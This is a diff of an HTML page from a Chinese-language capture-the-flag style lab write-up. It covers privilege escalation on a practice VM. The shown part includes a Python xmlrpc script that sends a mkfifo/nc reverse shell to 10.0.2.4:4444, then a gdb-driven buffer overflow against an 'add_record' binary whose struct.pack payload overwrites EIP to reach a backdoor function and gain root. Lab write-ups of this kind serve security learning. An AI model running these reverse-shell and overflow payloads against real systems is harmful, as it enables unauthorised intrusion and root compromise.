+<p>此时再次执行nc反弹 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> xmlrpc.client</span><br><span class="line"><span class="keyword">with</span> xmlrpc.client.ServerProxy(<span class="string">&quot;http://10.0.2.8:8000/&quot;</span>) <span class="keyword">as</span> proxy:</span><br><span class="line">    cmd = <span class="string">&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc 10.0.2.4 4444 &gt;/tmp/f&quot;</span></span><br><span class="line">    p = <span class="number">5166</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;the script is running:&quot;</span>)</span><br><span class="line">    proxy.secure_cmd(cmd, p)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;over!&quot;</span>)</span><br></pre></td></tr></table></figure></p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405222307.png" /></p>
 <p>成功提权到<code>socnet</code>。然后再次进行shell升级。</p>
 <h2 id="第二次权限提升缓存区溢出漏洞">第二次权限提升——缓存区溢出漏洞</h2>
@@ -388,9 +312,7 @@ server<span class="token punctuation">.</span>serve_forever<span class="token pu
 <li>Ever got in trouble?</li>
 <li>如果上个问题答案为1，则填写Explain；否则程序结束。</li>
 </ol>
-<p>输入下述命令开始动态调试： <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gdb -q ./add_record
-
-再次输入r才可以执行该程序。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></p>
+<p>输入下述命令开始动态调试： <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gdb -q ./add_record</span><br><span class="line"></span><br><span class="line">再次输入r才可以执行该程序。</span><br></pre></td></tr></table></figure></p>
 <blockquote>
 <p>如何找缓冲去漏洞呢？首先就是生成一长串的字符A，然后找到所有的数据提交点，每次测试一个提交点。比如上述有5个提交点，第一次将生成的字符串输入到Employee Name，其他提交点正常传入数据，以此类推。 这样就可以通过查看其他寄存器是否充满字符A来判断是否存在缓冲区漏洞。</p>
 </blockquote>
@@ -400,9 +322,9 @@ server<span class="token punctuation">.</span>serve_forever<span class="token pu
 <p>第二组测试<code>Explain</code></p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405224520.png" /></p>
 <p>可以看到许多寄存器都是A，证明该提交点存在缓冲区溢出漏洞。<strong>注意寄存器<code>EIP</code>，该寄存器存放的是CPU执行的下一条指令的存放地址</strong>。</p>
-<p>接着，需要判断EIP中的4个A是提交的字符串中的哪几个，可以先不断减少字符A的个数，然后提交，直到找到。也可以生成特征字符串（每4个为一个子串，在整个字符串中。子串是唯一的） <pre class="line-numbers language-none"><code class="language-none">pattern create [len] # 长度至少要保证EIP中充满A<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
+<p>接着，需要判断EIP中的4个A是提交的字符串中的哪几个，可以先不断减少字符A的个数，然后提交，直到找到。也可以生成特征字符串（每4个为一个子串，在整个字符串中。子串是唯一的） <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pattern create [len] # 长度至少要保证EIP中充满A</span><br></pre></td></tr></table></figure></p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405225135.png" /></p>
-<p>然后利用命令自动查找位置： <pre class="line-numbers language-none"><code class="language-none">pattern search<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
+<p>然后利用命令自动查找位置： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pattern search</span><br></pre></td></tr></table></figure></p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405225310.png" /></p>
 <p>EIP的第一个字符在特征字符串的位置是62（位置从0开始），因此，EIP在字符串中的位置就是62，63，64，65四个位置。可以验证一下，生成如下字符串：</p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405225456.png" /></p>
@@ -411,11 +333,10 @@ server<span class="token punctuation">.</span>serve_forever<span class="token pu
 <p>位置正确</p>
 <h3 id="查看汇编代码">查看汇编代码</h3>
 <h4 id="该程序的汇编代码">该程序的汇编代码</h4>
-<pre class="line-numbers language-none"><code class="language-none">disas main<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">disas main</span><br></pre></td></tr></table></figure>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405230105.png" /></p>
 <p>尖括号里面是函数，带<code>@plt</code>的是自带的函数，不带的则是自己编写的函数。<code>call</code>代表调用。最前面的16进制数字表示该指令存放的内存地址。</p>
-<p>可以通过打断点调试，测试函数的功能（以<code>0x080487ea</code>为例，断点要打在这句话的前一个位置）。 <pre class="line-numbers language-none"><code class="language-none">break *0x080487e7
-r<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></p>
+<p>可以通过打断点调试，测试函数的功能（以<code>0x080487ea</code>为例，断点要打在这句话的前一个位置）。 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">break *0x080487e7</span><br><span class="line">r</span><br></pre></td></tr></table></figure></p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405230637.png" /></p>
 <p>当输入1之后程序停止了，输入<code>s</code>单步运行，然后正好到我们要测试的函数<code>getchar@plt</code>，说明这里的作用就是获得我们的输入。</p>
 <p>注意到这里有一个<code>vuln</code>的函数。可以利用<code>info func</code>查看该程序的所有函数，发现里面有<code>system@plt, setuid@plt, vuln, backdoor</code></p>
@@ -431,18 +352,15 @@ r<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></
 <blockquote>
 <p>可以生成一个文件，把每一个问题的回答都写入，回答之间用换行符分割，然后 r &lt; filename，自动化执行。</p>
 </blockquote>
-<p>第一步，生成一个文件 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python -c <span class="token string">"import struct; print('h<span class="token entity" title="\n">\n</span>1<span class="token entity" title="\n">\n</span>1<span class="token entity" title="\n">\n</span>1<span class="token entity" title="\n">\n</span>' + 'A'*62 + struct.pack('I', 0x08048676))"</span> <span class="token operator">></span> payload<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
+<p>第一步，生成一个文件 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&quot;import struct; print(&#x27;h\n1\n1\n1\n&#x27; + &#x27;A&#x27;*62 + struct.pack(&#x27;I&#x27;, 0x08048676))&quot;</span> &gt; payload</span><br></pre></td></tr></table></figure></p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220406103054.png" /></p>
 <p>（观察前面注入BCDE的时候，EIP内容是BCDE，但是16进制是0x45444342，可以看到顺序被颠倒了，因此，我们写入backdoor函数的第一条指令的地址的时候也需要颠倒以下写进去，所以使用<code>struct.pack</code>）</p>
-<p>第二步，执行命令 <pre class="line-numbers language-none"><code class="language-none">r &lt; payload<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
+<p>第二步，执行命令 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">r &lt; payload</span><br></pre></td></tr></table></figure></p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220406103200.png" /></p>
-<p>注意下几句话： <pre class="line-numbers language-none"><code class="language-none">[New process 4825]
-process 4825 is executing new program: &#x2F;bin&#x2F;dash
-[New process 4826]
-process 4826 is executing new program: &#x2F;bin&#x2F;bash<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></p>
+<p>注意下几句话： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[New process 4825]</span><br><span class="line">process 4825 is executing new program: /bin/dash</span><br><span class="line">[New process 4826]</span><br><span class="line">process 4826 is executing new program: /bin/bash</span><br></pre></td></tr></table></figure></p>
 <p>当我们往<code>EIP</code>写入<code>backdoor</code>指令后，该程序就会自动调用<code>backdoor</code>函数，结果如上。如果没有调用该函数，那么就不会出现上述结果。因此，<code>backdoor</code>函数执行了<code>/bin/bash</code>和<code>/bin/dash</code>，并且在该程序执行完毕之后退出。</p>
 <p>因此，我们只需要正常的执行程序，然后在Explain处将<code>backdoor</code>函数的第一条指令写入到<code>EIP</code>寄存器即可获得root权限。</p>
-<p>第三步，动态调试验证 <pre class="line-numbers language-none"><code class="language-none">break vuln <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
+<p>第三步，动态调试验证 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">break vuln </span><br></pre></td></tr></table></figure></p>
 <p>单步执行到<code>backdoor</code>函数之后就需要慢点操作了。</p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220406104348.png" /></p>
 <p>单步执行到<code>setuid</code>函数。</p>
@@ -451,7 +369,7 @@ process 4826 is executing new program: &#x2F;bin&#x2F;bash<span aria-hidden="tru
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220406105131.png" /></p>
 <p>将<code>/bin/bash</code>写入到EAX寄存器，然后调用<code>system</code>函数去执行EAX中的指令，这样得到的结果就是root权限的shell。</p>
 <h3 id="漏洞利用">漏洞利用</h3>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> payload - <span class="token operator">|</span> ./add_record<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat payload - | ./add_record</span><br></pre></td></tr></table></figure>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220406105554.png" /></p>
 <p>（管道符前面的减号的意思是将payload中的内容作为标准输入输出。）</p>
 <p>成功获得root权限，这台靶机到此就全部结束了。</p>
@@ -516,7 +434,6 @@ process 4826 is executing new program: &#x2F;bin&#x2F;bash<span aria-hidden="tru
     <div id="actions-footer">
         <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
         <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
-        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
         <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
     </div>
 
